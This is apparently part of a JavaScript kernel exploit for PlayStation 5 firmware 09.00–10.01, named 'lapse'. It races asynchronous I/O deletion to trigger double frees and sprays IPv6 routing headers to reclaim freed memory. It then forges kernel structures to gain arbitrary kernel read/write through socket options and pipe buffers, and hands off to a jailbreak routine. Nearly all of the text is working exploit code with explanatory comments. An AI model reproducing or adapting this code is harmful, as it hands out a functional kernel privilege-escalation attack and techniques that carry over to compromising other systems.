    ST.aio_info_addr = rd64(r2, 0x18);
    log("reqs1=" + hex(ST.reqs1_addr) + " aio_info=" + hex(ST.aio_info_addr));

    /* Work out which sprayed id owns the entry we can see: cancel one batch at
     * a time and watch for OUR entry's state flipping to ABORTED. */
    let found = false, rest = 0;
    for (let batch = 0; batch < N6; batch += NUM6) {
        process_aio(AIO_OP_CANCEL, leakIds, batch, NUM6);
        get_rthdr(ST.rthdr_twins[0], 0x800);
        if (rd32(ST.leak + BigInt(ST.reqs2_leak_off), 0x38) === AIO_STATE_ABORTED) {
            ST.target_id = rd32(leakIds, batch * 4);
            wr32(leakIds, batch * 4, 0);          // keep it out of the cleanup
            rest = batch + NUM6; found = true;
            log("target_id=" + hex(ST.target_id) + " at batch " + (batch / NUM6));
            break;
        }
    }
    if (!found) throw new Error("lapse: could not find target_id");

    process_aio(AIO_OP_CANCEL, leakIds, rest, N6 - rest);
    process_aio(AIO_OP_POLL | AIO_OP_DELETE, leakIds, 0, N6);
}

/* ---------------------------------------------------- double_free_reqs1 */

function double_free_reqs1() {
    const NB = 2, TOTAL = AIO_MAX_NUM * NB;
    const ids = alloc(4 * TOTAL);
    bzero(ids, 4 * TOTAL);
    build_reqs1(AIO_MAX_NUM, -1);

    sc("evf_delete", S(ST.evf));

    // wait until an AIO queue entry lands in the freed chunk
    let leaked = false;
    for (let i = 0; i < ATTEMPT_NUM && !leaked; i++) {
        spray_aio(AIO_CMD_READ | AIO_CMD_MULTI, AIO_MAX_NUM, ids, TOTAL);
        const len = get_rthdr(ST.rthdr_twins[0], 0x800);
        if (len === 8 && rd32(ST.leak, 0x00) === AIO_CMD_READ) {
            leaked = true;
            process_aio(AIO_OP_CANCEL, ids, 0, TOTAL);
            log("leaked AIO queue entry after " + i + " rounds");
            break;
        }
        process_aio(AIO_OP_CANCEL | AIO_OP_POLL | AIO_OP_DELETE, ids, 0, TOTAL);
    }
    if (!leaked) throw new Error("lapse: could not leak an AIO queue entry");

    /* Forge an aio_entry whose ar2_info / ar2_batch point into our own reqs1,
     * so deleting it frees a chunk another id also owns. */
    bzero(ST.spray, 0x100);
    ST.sprayLen = build_rthdr(ST.spray, 0x80);
    wr32(ST.spray, 0x04, 5);                       // ar2_ticket
    wr64(ST.spray, 0x18, ST.reqs1_addr);           // ar2_info
    wr64(ST.spray, 0x20, ST.reqs1_addr + 0x28n);   // ar2_batch

    sc("close", S(ST.rthdr_twins[0]));
    ST.rthdr_twins = [0, 0];

    let reqId = 0, over = false;
    for (let i = 0; i < ATTEMPT_NUM && !over; i++) {
        for (const s of ST.socks) set_rthdr(s);
        for (let batch = 0; batch < TOTAL && !over; batch += AIO_MAX_NUM) {
            for (let k = 0; k < AIO_MAX_NUM; k++) wr32(ST.outs, k * 4, 0xffffffff);
            process_aio(AIO_OP_CANCEL, ids, batch, AIO_MAX_NUM);
            for (let k = 0; k < AIO_MAX_NUM; k++) {
                if (rd32(ST.outs, k * 4) === AIO_STATE_COMPLETE) {
                    reqId = rd32(ids, (batch + k) * 4);
                    wr32(ids, (batch + k) * 4, 0);
                    over = true;
                    log("overwrote crafted entry: req_id=" + hex(reqId)
                        + " after " + i + " rounds");
                    break;
                }
            }
        }
    }
    if (!over) throw new Error("lapse: could not overwrite the crafted AIO entry");

    process_aio(AIO_OP_POLL | AIO_OP_DELETE, ids, 0, TOTAL);

    const pair = alloc(8);
    wr32(pair, 0x00, reqId);
    wr32(pair, 0x04, ST.target_id);
    process_aio(AIO_OP_POLL, pair, 0, 2);          // makes them deletable

    /* THE SECOND DOUBLE FREE, on the 0x100 zone: target_id's reqs1 and
     * req_id's ar2_info are the same address, so deleting both frees it twice.
     * Reclaim IMMEDIATELY — the validation below is slow, and anything else on
     * the system could take the chunk while we are checking. */
    process_aio(AIO_OP_DELETE, pair, 0, 2);
    const e0 = rd32(ST.outs, 0x00), e1 = rd32(ST.outs, 0x04);

    let err = null;
    try {
        make_pktopts_twins();
        find_rthdr_twins();
    } catch (e) { err = e; }

    process_aio(AIO_OP_POLL, pair, 0, 2);
    const s0 = rd32(ST.outs, 0x00);
    log("pair delete errs=" + hex(e0) + "/" + hex(e1) + " status0=" + hex(s0));
    if (err) throw err;
    if (s0 !== SCE_KERNEL_ERROR_ESRCH)
        throw new Error("lapse: bad delete of the corrupt AIO request (status "
                        + hex(s0) + ")");
    if (e0 !== 0 || e1 !== 0)
        throw new Error("lapse: bad delete of the id pair (" + hex(e0) + "/"
                        + hex(e1) + ")");
}

/* ----------------------------------------------------------- kernel R/W */

function make_karw() {
    bzero(ST.spray, 0x100);
    ST.sprayLen = build_rthdr(ST.spray, 0x100);

    const pktinfoAddr = ST.reqs1_addr + 0x10n;
    /* pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo — the self-pointer that
     * turns IPV6_PKTINFO into a write primitive aimed at the pktopts itself. */
    wr64(ST.spray, 0x10, pktinfoAddr);

    sc("close", S(ST.pktopts_twins[1]));

    const tc = alloc(4), tcl = alloc(4);
    let over = false;
    for (let i = 0; i < ATTEMPT_NUM && !over; i++) {
        for (let j = 0; j < ST.socks.length; j++) {
            wr32(ST.spray, 0xc0, ((j << 0x10) | 0x1337) >>> 0);
            set_rthdr(ST.socks[j]);
        }
        wr32(tcl, 0x00, 4);
        sc("getsockopt", S(ST.pktopts_twins[0]), S(IPPROTO_IPV6), S(IPV6_TCLASS),
           BigInt(tc), BigInt(tcl));
        const marker = rd32(tc, 0x00);
        if ((marker & 0xffff) === 0x1337) {
            const idx = marker >>> 0x10;
            if (idx < ST.socks.length) {
                ST.pktopts_twins[1] = ST.socks[idx];
                ST.socks.splice(idx, 1);
                over = true;
                log("overwrote pktopts of " + ST.pktopts_twins[0] + " with sock "
                    + ST.pktopts_twins[1] + " after " + i + " rounds");
            }
        }
    }
    if (!over) throw new Error("lapse: could not overwrite the pktopts");

    const pktinfo = alloc(0x14), nhop = alloc(4), buf = alloc(8);

    /* 8-byte kernel read via IPV6_NEXTHOP.
     *
     * ip6po_nexthop is handed back as a sockaddr whose LENGTH is the first byte
     * at the target address, so a read stops early whenever it meets a zero.
     * Loop until all 8 bytes are covered, writing a 0 wherever the kernel
     * returned nothing — that is how a NUL inside the qword is recovered. */
    function kread8(addr) {
        if (addr === 0n) throw new Error("lapse: kread8(0)");
        wr64(buf, 0, 0n);
        let off = 0;
        while (off < 8) {
            wr64(pktinfo, 0x00, pktinfoAddr);
            wr64(pktinfo, 0x08, addr + BigInt(off));
            sc("setsockopt", S(ST.pktopts_twins[0]), S(IPPROTO_IPV6),
               S(IPV6_PKTINFO), BigInt(pktinfo), S(0x14));
            wr32(nhop, 0x00, 8 - off);
            sc("getsockopt", S(ST.pktopts_twins[0]), S(IPPROTO_IPV6),
               S(IPV6_NEXTHOP), BigInt(buf) + BigInt(off), BigInt(nhop));
            const n = rd32(nhop, 0x00);
            if (n === 0) { wr8b(buf, off, 0); off += 1; } else { off += n; }
        }
        return rd64(buf, 0);
    }
    ST.kread8 = kread8;

    // Prove it before trusting it: evf.cv.cv_description is the string "evf cv"
    const probe = kread8(ST.evf_cv);
    let s = "";
    for (let i = 0; i < 6; i++)
        s += String.fromCharCode(Number((probe >> BigInt(i * 8)) & 0xffn));
    log("kread8(evf_cv) = " + JSON.stringify(s));
    if (s !== "evf cv")
        throw new Error("lapse: kread8 self-test failed, got " + JSON.stringify(s));

    const p = kread8(ST.aio_info_addr + 8n);
    if ((p & 0xffff000000000000n) !== 0xffff000000000000n)
        throw new Error("lapse: curproc " + hex(p) + " is not a kernel address");
    ST.curproc = p;
    log("curproc=" + hex(p) + " pid=" + Number(kread8(p + 0xbcn) & 0xffffffffn));

    const p_fd = kread8(p + 0x48n);
    ST.fdt_ofiles = kread8(p_fd) + 8n;
    log("fdt_ofiles=" + hex(ST.fdt_ofiles));

    const mfp = kread8(ST.fdt_ofiles + BigInt(ST.master_pipe[0]) * FILEDESCENT_SIZE);
    const sfp = kread8(ST.fdt_ofiles + BigInt(ST.slave_pipe[0]) * FILEDESCENT_SIZE);
    const mdata = kread8(mfp), sdata = kread8(sfp);
    log("master f_data=" + hex(mdata) + " slave f_data=" + hex(sdata));

    /* Aim the pktopts at the master pipe's pipe_buffer, then write a pipebuf
     * whose .buffer is the SLAVE pipe's struct. From here on, writing the
     * master pipe rewrites the slave's buffer pointer, and reading/writing the
     * slave moves data to or from any kernel address — the same pipe primitive
     * netctrl-ps5.js already drives, which is what makes the handoff possible. */
    bzero(pktinfo, 0x14);
    wr64(pktinfo, 0x00, mdata + 8n);      // &pipe->pipe_buffer.out
    wr64(pktinfo, 0x08, 0n);
    sc("setsockopt", S(ST.pktopts_twins[0]), S(IPPROTO_IPV6), S(IPV6_PKTINFO),
       BigInt(pktinfo), S(0x14));

    wr32(pktinfo, 0x00, 0);               // pipebuf.out
    wr32(pktinfo, 0x04, PAGE_SIZE);       // pipebuf.size
    wr64(pktinfo, 0x08, sdata);           // pipebuf.buffer
    sc("setsockopt", S(ST.pktopts_twins[0]), S(IPPROTO_IPV6), S(IPV6_PKTINFO),
       BigInt(pktinfo), S(0x14));

    log("kernel R/W established");
}

/* ----------------------------------------------------------------- init */

function init() {
    ST.reqs1 = BigInt(alloc(SIZEOF_AIO_RW_REQUEST * AIO_MAX_NUM));
    ST.ids   = BigInt(alloc(4 * AIO_MAX_NUM));
    ST.outs  = BigInt(alloc(4 * AIO_MAX_NUM));
    ST.tmp   = BigInt(alloc(0x100));
    ST.spray = BigInt(alloc(0x100));
    ST.leak  = BigInt(alloc(0x800));
    ST.lenp  = BigInt(alloc(4));
    bzero(ST.reqs1, SIZEOF_AIO_RW_REQUEST * AIO_MAX_NUM);
    bzero(ST.ids, 4 * AIO_MAX_NUM);
    bzero(ST.outs, 4 * AIO_MAX_NUM);
    bzero(ST.spray, 0x100);
    bzero(ST.leak, 0x800);
    ST.sprayLen = build_rthdr(ST.spray, 0x80);

    const pb = alloc(8);
    if (sc("pipe2", BigInt(pb), 0n) !== 0) throw new Error("lapse: pipe2(master)");
    ST.master_pipe = [rd32(pb, 0) | 0, rd32(pb, 4) | 0];
    if (sc("pipe2", BigInt(pb), 0n) !== 0) throw new Error("lapse: pipe2(slave)");
    ST.slave_pipe = [rd32(pb, 0) | 0, rd32(pb, 4) | 0];

    ST.socks = [];
    for (let i = 0; i < IPV6_SOCK_NUM; i++)
        ST.socks.push(make_socket(AF_INET6, SOCK_DGRAM));

    gadgets();
    log("init ok reqs1=" + hex(ST.reqs1) + " socks=" + ST.socks.length
        + " pipes=" + ST.master_pipe.join("/") + " " + ST.slave_pipe.join("/"));
}

const LAPSE_FIRMWARES = new Set(["09.00", "09.20", "09.40", "09.60",
                                 "10.00", "10.01"]);

function run() {
    const sk = window.slopkit || {};
    const fw = String(sk.FW_VERSION || "");
    if (!LAPSE_FIRMWARES.has(fw)) {
        log("fw " + fw + " is outside lapse's window (09.00-10.01). "
            + "_aio_multi_delete was reworked after 10.01 — see this file's "
            + "header — so racing it here is not supported.");
        return false;
    }

    /* Mark the kernel dirty BEFORE the first free. Everything from here on
     * leaves a chunk on the free list twice; re-arming on that state without a
     * reboot is what turns a clean failure into a panic. */
    try { sessionStorage.setItem("netctrl_dirty", "1"); } catch (e) {}

    init();
    setup();
    // double_free_reqs2 reclaims the freed chunk itself (find_rthdr_twins runs
    // inside its win branch), so the twins already exist by the time it returns.
    const won = double_free_reqs2();
    log("aio double free won on attempt " + won.attempt
        + ", rthdr twins " + ST.rthdr_twins.join("/"));

    leak_kaddrs();
    double_free_reqs1();
    make_karw();

    /* Hand off to netctrl-ps5.js. Its KRW is the pipe primitive we just built,
     * and allproc / jailbreak / elfldr above it are route-independent, so there
     * is nothing lapse-specific left to do. */
    const N = window.netctrl_ps5;
    if (!N) throw new Error("lapse: netctrl_ps5 not loaded for the handoff");
    N.ST.master_pipe = ST.master_pipe;
    N.ST.victim_pipe = ST.slave_pipe;
    N.ST.fdt_ofiles = ST.fdt_ofiles;
    N.ST.curproc = ST.curproc;
    /* KRW.scratch is normally allocated inside netctrl's OWN make_karw, which
     * this path never runs. Without it every KRW.corrupt() would write the
     * forged pipebuf to address 0 — silently, since the write goes through the
     * pipe rather than faulting here. */
    N.KRW.scratch = BigInt(alloc(0x100));
    log("handoff curproc=" + hex(ST.curproc) + " fdt=" + hex(ST.fdt_ofiles)
        + " scratch=" + hex(N.KRW.scratch));

    /* Cross-check the pipe KRW against the pktopts reader before anything
     * writes through it. They are independent primitives, so agreement on one
     * qword is strong evidence the forged pipebuf landed correctly. */
    const viaPipe = N.KRW.r64(ST.curproc + 0x48n);
    const viaPkt = ST.kread8(ST.curproc + 0x48n);
    log("KRW cross-check pipe=" + hex(viaPipe) + " pktopts=" + hex(viaPkt));
    if (viaPipe !== viaPkt)
        throw new Error("lapse: pipe KRW disagrees with the pktopts read ("
                        + hex(viaPipe) + " vs " + hex(viaPkt) + ")");

    N.find_allproc();
    N.ps5_jailbreak();
    log("JAILBROKEN via lapse");
    try { sessionStorage.removeItem("netctrl_dirty"); } catch (e) {}
    return true;
}

window.lapse_ps5 = {
    run, init, setup, double_free_reqs2, leak_kaddrs, double_free_reqs1, make_karw,
    find_rthdr_twins, make_pktopts_twins, build_reqs1, set_req_fd, spray_aio,
    process_aio, spawnDeleteRacer, verify_reqs2, build_rthdr, set_rthdr,
    get_rthdr, free_rthdr, ST, SYS, LAPSE_FIRMWARES,
    version: "lapse-ps5 1.0",
};
log("loaded — " + window.lapse_ps5.version);

})();
